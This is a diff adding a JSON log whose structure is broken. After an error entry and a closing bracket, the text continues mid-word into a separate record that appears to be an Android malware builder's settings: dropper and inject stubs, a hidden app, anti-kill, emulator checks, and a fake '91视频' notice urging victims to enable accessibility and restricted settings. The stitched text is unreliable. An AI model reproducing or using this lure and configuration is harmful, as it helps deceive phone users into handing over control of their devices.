@@ -1,0 +1,8 @@
+[
+  {
+    "Date": "04/26/2026 13:54:27",
+    "Content": ">InsertApp Error 2: Response status code does not indicate success: 404 (Not Found)."
+  }
+]er.invoker.shuffler\r\nUserid: 130340\r\nClientName: 测试\r\nEmail: QhxDceXrbTaim5sw7A7Ck1p9PwFxxRlveQDXzjOT0MUEm350BgUppgcEU2d3j4RW\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: al.s2e7.my\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 测试\r\nappversion: 5.5.4\r\nappicopath: 898a8f5d54314b8510b3d8cfecd64639.png\r\nappurl: DpveQE4ECj71P3/Ba6hhLw==\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort: 91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/al.s2e7.my/user/ui/6b97b5f9d875b0c0b3bc5cfcb35a4e02.png\r\ninstalltype: g\r\nhidetype: k\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/al.s2e7.my/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/al.s2e7.my/user/storage/130340/icons/898a8f5d54314b8510b3d8cfecd64639.png\r\nDropStub: /www/wwwroot/al.s2e7.my/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/al.s2e7.my/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/al.s2e7.my/user/apps/130340/net.updater.invoker.shuffler"
+  }
+]
